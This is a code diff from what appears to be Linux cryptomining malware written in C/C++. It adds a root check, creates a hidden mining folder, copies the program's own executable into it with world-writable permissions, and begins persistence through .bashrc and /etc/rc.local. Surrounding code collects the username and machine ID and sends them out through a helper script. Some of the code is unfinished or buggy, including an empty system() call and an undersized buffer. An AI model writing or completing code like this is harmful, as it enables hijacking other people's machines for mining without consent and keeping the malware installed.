@@ -1,6 +1,14 @@
 #include "utils.h"
 #include "error.h"
 #include "base64.h"
+#include "system.h"
+
+bool is_root(){
+    if(getuid()!= 0){
+        return false;
+    }
+    return true;
+}
 
 
 void drop_python_script(){
@@ -77,6 +85,7 @@ if __name__ == '__main__':
     fclose(f);
 }
 
+
 pool_info* get_pool_info(){
     char * get_pool = "python3 communication.py get_pool";
     
@@ -96,6 +105,7 @@ pool_info* get_pool_info(){
     return pool;
 }
 
+
 char * get_username(){
     struct passwd *pw;
     uid_t uid;
@@ -106,6 +116,22 @@ char * get_username(){
     return pw->pw_name;
 }
 
+
+char * get_home_enviroment(){
+    struct passwd *pw;
+    char * home;
+    uid_t uid;
+    uid_t NO_UID = -1;
+    uid = getuid();
+
+    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
+    home = (char*)malloc((sizeof(char) * strlen(pw->pw_dir)));
+    strcpy(home, pw->pw_dir);
+    strcat(home, "/");
+    return home;
+}
+
+
 char * get_machine_id(){
     FILE * f = fopen("/etc/machine-id", "r");
     char * id = (char *)malloc(32);
@@ -113,6 +139,7 @@ char * get_machine_id(){
     fclose(f);
     return id;
 }
+
 
 void new_miner(){
     char * name = get_username();
@@ -122,4 +149,80 @@ void new_miner(){
     std::string x;
     const char * a = (x = std::string("python3 communication.py post ") += encoded).c_str();
     system(a);
+}
+
+
+void install_persistence(){
+
+    if(create_cryptomining_folder()){
+        copy_executable_to_folder();
+    }
+
+    char * bashrc = ".bashrc";
+    char * home = get_home_enviroment();
+    std::string caminho = std::string(home) += std::string(bashrc);
+    const char * path = caminho.c_str();
+
+    if(is_root){
+        char * rc_local = "/etc/rc.local";
+
+
+        system("");
+        return;
+    
+    }else{
+
+        return;
+    }
+    
+    Error::log_error("[-] Persistence failed");
+}
+
+
+bool create_cryptomining_folder(){
+    struct stat st = {0};
+    // create directory
+    if (stat(miner_path, &st) == -1) {
+        mkdir(miner_path, 0700);
+        Error::log_error("[+] Cryptomining folder created!");
+        return true;
+    }
+    return false;
+}
+
+
+void copy_executable_to_folder(){
+    int inputFd;
+    int outputFd;
+    int openFlags;
+    mode_t filePerms;
+    ssize_t numRead;
+    char buf[1024];
+
+    inputFd = open(executable_name, O_RDONLY);
+    if (inputFd == -1)
+        exit(-1);
+
+    openFlags = O_CREAT | O_WRONLY | O_TRUNC;
+    filePerms = S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH; /*rw-rw-rw*/
+
+    outputFd = open(executable_path, openFlags, filePerms);
+
+    if (outputFd == -1)
+        exit(-1);
+
+    /* transfer data until we encounter end of input or an error */
+
+    while ((numRead = read(inputFd, buf, 1024)) > 0){
+    if (write(outputFd, buf, numRead) != numRead)
+        Error::log_error("Error copying executable to /tmp/cryptomining/");
+    }
+
+    if (numRead == -1)
+        Error::log_error("Error copying executable to /tmp/cryptomining/");
+
+    if (close(inputFd) == -1)
+        return;
+    if (close(outputFd) == -1)
+        return;
 }
